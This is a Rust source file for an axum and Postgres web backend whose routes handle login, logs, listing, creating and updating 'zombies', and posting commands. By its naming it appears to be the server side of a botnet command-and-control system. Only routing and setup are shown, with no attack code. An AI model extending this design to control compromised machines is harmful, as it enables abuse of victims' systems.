use axum::{
    routing::{get, patch, post},
    Router,
};
use log::{create_log, get_logs};
use login_controller::{get_info_handler, login_handler};
use update::{create_command, create_zombie, get_zombies, update_zombie};
use sqlx::postgres::PgPoolOptions;
use tokio::net::TcpListener;

mod login_controller;
mod login_model;

mod update;
mod log;

#[tokio::main]
async fn main() {
    // expose the environment variables
    dotenvy::dotenv().expect("Unable to read .env file");

    // set variables from the environment variables
    let server_url = std::env::var("SERVER_URL").unwrap_or("127.0.0.1:3000".to_owned());
    let database_url = std::env::var("DATABASE_URL").expect("DATABASE_URL not found in the .env file!");

    // create the database pool
    let db_pool = PgPoolOptions::new().max_connections(16)
        .connect(&database_url)
        .await
        .expect("Could not establish Database connection");

    // create our TCP listener
    let listener = TcpListener::bind(server_url)
        .await
        .expect("Could not create TCP Listener");

    println!("Backend is online at {}", listener.local_addr().unwrap());

    //sqlx::migrate!("./migrations").run(&db_pool).await.expect("Could not build Database!");

    // compose the routes
    let app = Router::new()
        .route("/login", post(login_handler))
        .route("/info", get(get_info_handler))
        .route("/log", get(get_logs).post(create_log))
        .route("/update", get(get_zombies).post(create_zombie))
        .route("/update/:usr_id", patch(update_zombie))
        .route("/command", post(create_command))

        // access to database
        .with_state(db_pool);

    // Serve the application
    axum::serve(listener, app)
        .await
        .expect("Error serving application")
}